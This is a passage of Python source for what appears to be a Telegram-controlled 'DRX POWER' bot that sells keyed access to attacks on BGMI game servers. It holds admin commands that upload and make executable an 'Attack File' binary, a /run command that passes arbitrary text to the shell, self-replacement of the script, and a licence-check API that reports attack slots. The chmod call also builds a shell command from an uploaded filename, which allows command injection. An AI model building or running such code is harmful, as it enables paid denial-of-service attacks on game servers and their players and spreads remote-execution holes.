        del db['groups'][target_group]
        save_db(db)
        bot.reply_to(message, f"🗑️ Group <code>{target_group}</code> access removed.", parse_mode="HTML")

# --- [ COMMAND 1: UPDATE SCRIPT (drx.py) ] ---
@bot.message_handler(commands=['update'])
def update_script_logic(message):
    if str(message.chat.id) not in ADMIN_IDS: return
    
    msg = bot.reply_to(message, "🚀 <b>𝐒𝐞𝐧𝐝 𝐭𝐡𝐞 𝐧𝐞𝐰 <code>drx.py</code> 𝐟𝐢𝐥𝐞 𝐧𝐨𝐰.</b>\n(Agla message aapki file honi chahiye)", parse_mode="HTML")
    bot.register_next_step_handler(msg, process_script_upload)

def process_script_upload(message):
    if not message.document:
        bot.reply_to(message, "❌ <b>𝐅𝐢𝐥𝐞 𝐧𝐨𝐭 𝐟𝐨𝐮𝐧𝐝!</b> Update cancelled.")
        return
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        with open(SCRIPT_NAME, 'wb') as f:
            f.write(downloaded_file)
        
        bot.reply_to(message, "✅ <b>𝐒𝐜𝐫𝐢𝐩𝐭 𝐔𝐩𝐝𝐚𝐭𝐞𝐝!</b>\n🔄 Restarting bot...", parse_mode="HTML")
        os.execv(sys.executable, ['python', SCRIPT_NAME])
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")

# --- [ COMMAND 2: UPLOAD BINARY (Attack File) ] ---
@bot.message_handler(commands=['upbin'])
def upload_binary_logic(message):
    if str(message.chat.id) not in ADMIN_IDS: return
    
    msg = bot.reply_to(message, "📤 <b>𝐒𝐞𝐧𝐝 𝐲𝐨𝐮𝐫 𝐁𝐢𝐧𝐚𝐫𝐲 𝐟𝐢𝐥𝐞 (𝐞.𝐠. drx_king) 𝐧𝐨𝐰.</b>", parse_mode="HTML")
    bot.register_next_step_handler(msg, process_binary_upload)

def process_binary_upload(message):
    if not message.document:
        bot.reply_to(message, "❌ <b>𝐁𝐢𝐧𝐚𝐫𝐲 𝐟𝐢𝐥𝐞 𝐧𝐨𝐭 𝐟𝐨𝐮𝐧𝐝!</b>")
        return
    try:
        bin_name = message.document.file_name
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        with open(bin_name, 'wb') as f:
            f.write(downloaded_file)
        
        # Auto-Permission dena
        os.system(f"chmod +x {bin_name}")
        
        bot.reply_to(message, (
            f"✅ <b>𝐁𝐈𝐍𝐀𝐑𝐘 𝐒𝐄𝐓𝐔𝐏 𝐃𝐎𝐍𝐄!</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📁 <b>𝐅𝐢𝐥𝐞:</b> <code>{bin_name}</code>\n"
            f"🛡️ <b>𝐏𝐞𝐫𝐦𝐢𝐬𝐬𝐢𝐨𝐧:</b> <code>chmod +x</code> (Applied)\n"
            f"💡 <i>Ab aap ise /bgmi me use kar sakte hain.</i>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━"
        ), parse_mode="HTML")

    except Exception as e:
        bot.reply_to(message, f"❌ <b>Upload Error:</b>\n<code>{str(e)}</code>", parse_mode="HTML")

# --- [ BONUS: REMOTE TERMINAL COMMAND ] ---
@bot.message_handler(commands=['run'])
def run_remote_terminal(message):
    if str(message.chat.id) not in ADMIN_IDS: return
    
    cmd_text = message.text.split(maxsplit=1)
    if len(cmd_text) < 2:
        bot.reply_to(message, "⚠️ <b>Usage:</b> <code>/run ls</code>", parse_mode="HTML")
        return
    
    try:
        output = os.popen(cmd_text[1]).read()
        bot.reply_to(message, f"🖥️ <b>𝐓𝐞𝐫𝐦𝐢𝐧𝐚𝐥:</b>\n<pre>{output if output else 'Done (No Output)'}</pre>", parse_mode="HTML")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")

@bot.message_handler(commands=['news'])
def send_news(message):
    user_id = str(message.chat.id)
    
    # Sirf Admin access
    if user_id not in ADMIN_IDS:
        return

    # Check agar message khali hai
    cmd_text = message.text.split(maxsplit=1)
    if len(cmd_text) < 2:
        bot.reply_to(message, "❌ <b>Usage:</b> <code>/news [Your Message]</code>", parse_mode="HTML")
        return

    news_content = cmd_text[1]
    db = load_db()
    all_users = db.get('all_users', [])

    if not all_users:
        bot.reply_to(message, "❌ No users found in database!")
        return

    bot.reply_to(message, f"🚀 <b>Sending News to {len(all_users)} users...</b>", parse_mode="HTML")

    success = 0
    failed = 0

    for uid in all_users:
        try:
            # Professional News Layout
            bot.send_message(uid, (
                f"🛰️ <b>𝐀𝐏𝐑𝐎𝐗-𝐏𝐎𝐖𝐄𝐑 𝐁𝐎𝐓 𝐔𝐏𝐃𝐀𝐓𝐄</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"{news_content}\n\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"📅 <b>𝐃𝐚𝐭𝐞:</b> <code>{datetime.now().strftime('%d-%m-%Y')}</code>\n"
                f"👑 <b>𝐀𝐝𝐦𝐢𝐧:</b> {CONFIG['footer']}"
            ), parse_mode="HTML")
            success += 1
        except Exception:
            failed += 1

    # Final Report to Admin
    bot.reply_to(message, (
        f"✅ <b>𝐍𝐞𝐰𝐬 𝐃𝐞𝐥𝐢𝐯𝐞𝐫𝐲 𝐑𝐞𝐩𝐨𝐫𝐭</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🎯 Total Users: <code>{len(all_users)}</code>\n"
        f"🟢 Success: <code>{success}</code>\n"
        f"🔴 Failed: <code>{failed}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━"
    ), parse_mode="HTML")

@app.route('/handshake', methods=['GET'])
def handshake():
    # - Integrity Check
    apk_signature = request.headers.get('X-APK-SIG')
    if apk_signature != "SECURE_SIG_123": #
        return jsonify({"status": "crash", "url": TELEGRAM_CHANNEL}), 403
    
    key = request.args.get('key')
    db = load_db()
    user_data = db.get('users', {}).get(key)
    
    if not user_data:
        return jsonify({"status": "expired", "buy_url": "https://t.me/drx_power"}), 200
    
    return jsonify({"status": "success", "expiry": user_data, "slots": f"{len(active_attacks)}/{CONFIG['max_slots']}"})

# - Flask Runner
def run_api():
    app.run(host='0.0.0.0', port=5000)
threading.Thread(target=run_api, daemon=True).start()
 
# --- [ 3. PROFESSIONAL DYNAMIC BANNER ] ---
def print_banner():
    color = get_random_color()
    reset = "\033[0m"
    os.system('clear')
    
    # Raw string (r) use ki hai taki '\' se error na aaye
    banner = fr"""
{color}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{color}  _____  _______  __  _____   ______          ________ _____  
{color} |  __ \|  __ \ \ / / |  __ \ / __ \ \        / /  ____|  __ \ 
{color} | |  | | |__) \ V /  | |__) | |  | \ \  /\  / /| |__  | |__) |
{color} | |  | |  _  / > <   |  ___/| |  | |\ \/  \/ / |  __| |  _  / 
{color} | |  | | | \ \/ . \  | |    | |__| | \  /\  /  | |____| | \ \ 
{color} |_____/|_|  \_\_/\_\ |_|     \____/   \/  \/   |______|_|  \_\
                                                               
\033[1;37m                 🚀 DRX POWER MASTER SCRIPT 🚀
{color}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[1;37m  👑 Owner: {CONFIG['footer']} | 🛰️ Status: Online
{color}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{reset}
"""
    print(banner)

# --- [ 4. BOT POLLING WITH ERROR HANDLING ] ---
if __name__ == "__main__":
    print_banner()
    while True:
        try:
            # Bot info print karna
            bot_info = bot.get_me()
            print(f"\033[1;32m[+] DRX POWER BOT SUCCESSFUL ✅ STATED @{bot_info.username}\033[0m")
            bot.polling(none_stop=True, interval=0, timeout=20)
        except Exception as e:
            print(f"\033[1;31m[!] Error: {e}. Restarting in 5s...\033[0m")
            time.sleep(5)
            print_banner() # Restart par naya color aayega
